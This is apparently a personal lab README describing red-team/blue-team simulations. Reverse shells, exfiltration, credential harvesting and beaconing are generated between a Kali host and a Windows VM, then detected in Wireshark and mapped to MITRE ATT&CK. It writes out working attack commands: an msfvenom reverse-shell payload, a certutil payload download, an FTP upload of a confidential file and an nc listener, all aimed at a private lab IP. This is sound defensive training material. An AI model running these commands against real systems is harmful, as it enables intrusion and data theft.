# 🔍 Network Analysis Project

## 📌 Overview
This project demonstrates **end-to-end adversary simulation and network traffic analysis** in a controlled lab.  
Instead of relying on pre-made PCAPs, I **generated malicious traffic myself**, captured it, and analyzed it in Wireshark to show how a SOC analyst detects real-world threats.

I acted as both:
- **Red Team (Attacker):** Simulating MITRE ATT&CK techniques such as reverse shells, data exfiltration, credential dumping, and beaconing.
- **Blue Team (Defender):** Capturing PCAPs, analyzing traffic in Wireshark, and mapping detection logic to MITRE ATT&CK.

---

## 🖥️ Lab Setup
- **Attacker:** Kali Linux (`192.168.2.129`)
- **Victim:** Windows 10 FLARE VM (`192.168.2.131`)
- **Sniffer/Analyst:** Wireshark/tcpdump (ran on Kali or Security Onion)
- **Network:** VirtualBox Host-Only Network

---

## 🎯 Objectives
- Generate **realistic malicious traffic** (reverse shell, data exfiltration, credential harvesting, beaconing).
- Capture all traffic in **PCAP format**.
- Perform **forensic analysis** with Wireshark.
- Map detections to the **MITRE ATT&CK framework**.

---

## ⚔️ Red Team vs Blue Team Scenarios

### ✅ Scenario 1 — Reverse Shell (C2 over TCP)
- **Red Team Action:**  
  - Generated payload with `msfvenom`:
    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.129 LPORT=4444 -f exe -o payload.exe
    ```
  - Delivered via `certutil`:
    ```cmd
    certutil -urlcache -split -f http://192.168.2.129:8080/payload.exe payload.exe
    ```
  - Executed on victim to initiate a reverse shell back to attacker.

- **Blue Team Detection (Wireshark):**
  - Filter:
    ```wireshark
    tcp.port == 4444
    ```
  - Observed **outbound connection attempts** to attacker.
  - Followed TCP stream → saw command input/output (if successful).
  - **MITRE Mapping:** T1071 – Application Layer Protocol (C2).

---

### ✅ Scenario 2 — Data Exfiltration via HTTP
- **Red Team Action:**
  - Used built-in `certutil` to simulate data theft:
    ```cmd
    certutil -urlcache -split -f http://192.168.2.129:8080/secrets.txt
    ```
  - File contents were sent/downloaded via HTTP.

- **Blue Team Detection (Wireshark):**
  - Filter:
    ```wireshark
    http.request
    ```
  - Detected suspicious file transfer requests from victim to attacker.
  - **MITRE Mapping:** T1041 – Exfiltration Over C2 Channel.

---

### ✅ Scenario 3 — Credential Harvesting (Simulated)
- **Red Team Action:**
  - Simulated credential dumping attempt using a malicious binary.
  - Outbound connection attempted to send harvested credentials to attacker server.

- **Blue Team Detection (Wireshark):**
  - Filter suspicious traffic to attacker:
    ```wireshark
    ip.addr == 192.168.2.129
    ```
  - Identified repeated POST requests containing encoded credential strings.
  - **MITRE Mapping:** T1003 – OS Credential Dumping.

---

### ✅ Scenario 4 — Beaconing Behavior (C2 Heartbeats)
- **Red Team Action:**
  - Ran a custom payload that repeatedly attempted to connect to attacker every 10 seconds.
  - Simulated persistent C2 “beaconing.”

- **Blue Team Detection (Wireshark):**
  - Filter:
    ```wireshark
    tcp.port == 8080
    ```
  - Observed periodic outbound connections with no user activity.
  - Detected beaconing pattern (regular intervals).
  - **MITRE Mapping:** T1071.001 – Application Layer Protocol: Web Protocols.

---

### ✅ Scenario 5 — File Transfer via FTP
- **Red Team Action:**
  - Used Windows built-in `ftp` client to upload a file to attacker server:
    ```cmd
    ftp 192.168.2.129
    put confidential.docx
    ```

- **Blue Team Detection (Wireshark):**
  - Filter:
    ```wireshark
    ftp
    ```
  - Identified clear-text FTP session (username/password + file transfer).
  - **MITRE Mapping:** T1048 – Exfiltration Over Alternative Protocol.

---

## 📂 Evidence Collected
- `reverse_shell.pcap` → Reverse shell traffic capture
- `data_exfiltration.pcap` → Simulated exfiltration traffic
- `beaconing.pcap` → Periodic C2 beaconing attempts
- `ftp_exfiltration.pcap` → Clear-text FTP transfer
- Screenshots of:
  - Attacker listener (`nc -lvnp 4444`)
  - Victim command execution
  - Wireshark analysis (filters + streams)

---

## 🛡️ SOC Analyst Takeaways
- Reverse shells often show **unusual outbound connections** to non-standard ports.
- Data exfiltration stands out as **large HTTP/FTP transfers** to unexpected hosts.
- Beaconing can be detected by **regular periodic traffic** with no user action.
- Credential dumps frequently appear as **encoded POST data**.
- Cleartext protocols like FTP leak both credentials and files.

---

## 📊 MITRE ATT&CK Mapping
| Scenario | Technique ID | Name |
|----------|--------------|------|
| Reverse Shell | T1071 | Application Layer Protocol (C2) |
| Data Exfiltration | T1041 | Exfiltration Over C2 Channel |
| Credential Harvesting | T1003 | OS Credential Dumping |
| Beaconing | T1071.001 | Application Layer Protocol: Web Protocols |
| FTP Exfiltration | T1048 | Exfiltration Over Alternative Protocol |

---

## 📌 Resume-Ready Impact
> **Simulated adversary techniques** (MITRE ATT&CK T1071, T1041, T1003, T1048) in a controlled lab. Generated reverse shell, exfiltration, beaconing, and credential theft traffic, captured PCAPs, and performed forensic analysis in Wireshark to demonstrate SOC detection workflows.

---

## 🚀 Next Steps
- Add Snort/Suricata IDS signatures to alert on these behaviors.
- Ingest PCAPs into Splunk for SIEM correlation.
- Automate scenario generation with Python scripting.

---

## Author
Julian (SMOC) – Network Analysis Project
